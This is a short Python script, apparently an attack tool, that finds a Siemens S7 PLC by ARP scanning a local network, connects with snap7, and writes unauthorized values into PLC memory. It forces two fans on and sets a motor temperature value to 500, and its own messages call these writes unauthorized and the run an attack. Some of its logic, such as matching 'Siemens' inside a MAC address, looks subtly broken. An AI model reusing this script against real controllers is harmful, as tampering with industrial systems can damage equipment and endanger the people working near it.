import snap7
import struct
import scapy.all as scapy

# Function to use ARP scanning to find PLC IP address
def find_s7_plc_ip(network_prefix="192.168.1."):
    print("[*] Scanning network for Siemens S7 PLC...")
    for i in range(1, 255):  
        ip = f"{network_prefix}{i}"
        arp_request = scapy.ARP(pdst=ip)
        ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet = ether_frame / arp_request
        ans, _ = scapy.srp(arp_packet, timeout=1, verbose=False)
        
        for sent, received in ans:
            if "Siemens" in received.hwsrc:  
                print(f"[+] Siemens PLC found at {received.psrc}")
                return received.psrc
    return None

# Connect to the PLC
def connect_to_plc(plc_ip):
    plc = snap7.client.Client()
    print(f"[*] Attempting to connect to PLC at {plc_ip}...")
    
    try:
        plc.connect(plc_ip, 0, 1)  # Rack 0, Slot 1
        if plc.get_cpu_state() == "RUN":
            print(f"[+] Successfully connected to PLC ({plc_ip}) in RUN mode!")
        else:
            print(f"[!] Connected but CPU is NOT in RUN mode.")
        return plc
    except Exception as e:
        print(f"[X] Failed to connect to the PLC: {str(e)}")
        return None

# Function to send unauthorized control commands
def send_unauthorized_commands(plc):
    print("[*] Sending unauthorized command messages to PLC...")

    # Example: Force activation of Fan A and Fan B
    data = struct.pack('>?', True)  # Convert BOOL to byte data

    # Writing TRUE (forced activation) to memory areas of "Activate_Fan_A" and "Activate_Fan_B"
    plc.write_area(snap7.types.Areas.MK, 0, 0, data)  # Activate_Fan_A (%M0.0)
    plc.write_area(snap7.types.Areas.MK, 0, 1, data)  # Activate_Fan_B (%M0.1)

    print("[+] Successfully activated Fan A and Fan B unauthorizedly!")

    # Example: Set Motor_Temp to dangerous levels (e.g., 500, causing overheating response)
    motor_temp_val = struct.pack('>h', 500)  # INT format (2 bytes)
    plc.write_area(snap7.types.Areas.MK, 0, 7, motor_temp_val)  # Modify Motor_Temp (%MW7)
    
    print("[+] Motor temperature forcefully set to 500!")

# Main function
def main():
    plc_ip = find_s7_plc_ip()
    if not plc_ip:
        print("[X] No Siemens PLC found on network.")
        return

    plc = connect_to_plc(plc_ip)
    if plc:
        send_unauthorized_commands(plc)
        plc.disconnect()
        print("[*] Attack completed successfully.")

if __name__ == "__main__":
    main()